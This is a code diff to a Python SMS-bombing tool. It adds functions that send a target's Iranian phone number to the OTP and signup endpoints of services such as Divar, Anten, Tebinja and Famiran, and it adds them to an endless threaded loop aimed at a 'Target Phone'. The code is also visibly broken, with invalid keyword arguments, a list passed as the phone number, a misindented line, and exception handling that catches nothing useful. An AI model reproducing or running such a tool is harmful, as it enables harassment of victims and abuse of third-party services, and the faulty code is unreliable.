@@ -104,7 +104,48 @@ def zarin_plus(phone):
             print(f"{Fore.RED}Error! (-_-)")
     except SyntaxError:
         print(f"{Fore.RED}Error! (-_-)")
+def divar(phone):
+    divar = {"phone_number": phone.split('+')}
+    try:
+        divar_request = requests.post("https://api.divar.ir/v5/auth/authenticate", data=divar)
+        if "OTP successfully sent to user" in divar_request.text:
+            print(f"{Fore.GREEN }send sms :D")
+        else:
+            print(f"{Fore.RED}Error! (-_-)")
+    except SyntaxError:
+        print(f"{Fore.RED}Error! (-_-)")
 
+def anten(phone):
+    anten = {"phone_number": phone.split('+')}
+    try:
+        anten_request = requests.post("https://api2.anten.ir/users/", anten=divar)
+        if "OTP successfully sent to user" in anten_request.text:
+            print(f"{Fore.GREEN }send sms :D")
+        else:
+            print(f"{Fore.RED}Error! (-_-)")
+    except SyntaxError:
+        print(f"{Fore.RED}Error! (-_-)")
+
+def tebinja(phone):
+    tebinja = {"phone_number": phone.split('+')}
+    try:
+        tebinja_request = requests.post("https://www.tebinja.com/api/v1/users", tebinja=divar)
+        if "OTP successfully sent to user" in tebinja_request.text:
+            print(f"{Fore.GREEN }send sms :D")
+        else:
+            print(f"{Fore.RED}Error! (-_-)")
+    except SyntaxError:
+        print(f"{Fore.RED}Error! (-_-)")
+def famiran(phone):
+    famiran = {"phone_number": phone.split('+')}
+    try:
+        famiran_request = requests.post("https://api.famiran.com/api/user/signup", famiran=divar)
+        if "OTP successfully sent to user" in famiran_request.text:
+            print(f"{Fore.GREEN }send sms :D")
+        else:
+            print(f"{Fore.RED}Error! (-_-)")
+    except SyntaxError:
+        print(f"{Fore.RED}Error! (-_-)")
 
 def wall(phone):
     # wall api
@@ -147,7 +188,7 @@ def main():
     time.sleep(1)
     phone = '+98' + str(input(f"{Fore.GREEN }Target Phone : +98 "))
     while True:
-        Thread(target=snap, args=[phone]).start()
+       Thread(target=snap, args=[phone]).start()
         time.sleep(2)
         Thread(target=gap, args=[phone]).start()
         time.sleep(2)
@@ -155,12 +196,19 @@ def main():
         time.sleep(2)
         Thread(target=zarin_plus, args=[phone]).start()
         time.sleep(2)
+        Thread(target=divar, args=[phone]).start()
+        time.sleep(2)
         Thread(target=wall, args=[phone]).start()
+        time.sleep(2)
+        Thread(target=anten, args=[phone]).start()
+        time.sleep(2)
+        Thread(target=tebinja, args=[phone]).start()
+        time.sleep(2)
+        Thread(target=famiran, args=[phone]).start()
         time.sleep(2)
         Thread(target=torob, args=[phone]).start()
         print('----------------------')
         time.sleep(5)
-
 
         
 if __name__ == "__main__":
